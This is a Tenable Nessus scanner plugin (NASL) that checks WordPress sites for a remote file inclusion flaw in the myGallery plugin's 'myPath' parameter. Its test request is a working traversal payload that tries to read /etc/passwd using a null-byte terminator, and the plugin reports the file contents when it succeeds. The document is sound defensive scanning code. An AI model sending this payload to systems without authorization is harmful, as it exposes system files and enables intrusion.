#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25116);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/20 14:12:06 $");

  script_cve_id("CVE-2007-2426");
  script_bugtraq_id(23702);
  script_osvdb_id(34356);
  script_xref(name:"EDB-ID", value:"3814");

  script_name(english:"myGallery mygallerybrowser.php 'myPath' Parameter Remote File Inclusion");
  script_summary(english:"Attempts to read a local file with myGallery.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The third-party myGallery module for WordPress installed on the remote
host fails to sanitize input to the 'myPath' parameter of the
'/mygallery/myfunctions/mygallerybrowser.php' script before using it
to include PHP code. An unauthenticated attacker can exploit this
issue to view arbitrary files on the remote host or possibly to
execute arbitrary PHP code, perhaps from third-party hosts.

Note that exploitation of this issue does not require that PHP's
'register_globals' setting be enabled.");
  script_set_attribute(attribute:"see_also", value:"http://www.wildbits.de/2007/04/29/sicherheitsluecke-in-mygallery/");
  script_set_attribute(attribute:"solution", value:"Upgrade to myGallery version 1.4b5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/04/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/04/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "myGallery";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "mygallery/languages/myGallery.pot"][0] =
    make_list('myGallery', 'mygalleryoptions\\.php');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Try to retrieve a local file.
file = "/etc/passwd";
w = http_send_recv3(
  method:"GET",
  item:dir + "/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?" +
    "myPath=" + file + "%00",
  port:port,
  exit_on_fail:TRUE
);
res = w[2];

# There's a problem if...
if
(
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or...
    "main(" + file + "\\0/wp-config.php): failed to open stream" >< res ||
    # we get an error claiming the file doesn't exist or...
    "main(" + file + "): failed to open stream: No such file" >< res ||
    # we get an error about open_basedir restriction.
    "open_basedir restriction in effect. File(" + file >< res
)
{
  contents = NULL;
  if (egrep(string:res, pattern:"root:.*:0:[01]:"))
  {
    contents = res;
    contents = contents - strstr(contents, "<br");
  }

  if (contents && egrep(string:contents, pattern:"root:.*:0:[01]:"))
  {
    if (report_verbosity > 0)
    {
      report =
        "Here are the contents of the file '/etc/passwd' that Nessus was" +
        '\n' + 'able to read from the remote host :\n' +
        '\n' + contents;
      security_hole(port:port, extra:report);
    }
  }
  else security_hole(port);
  exit(0);
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
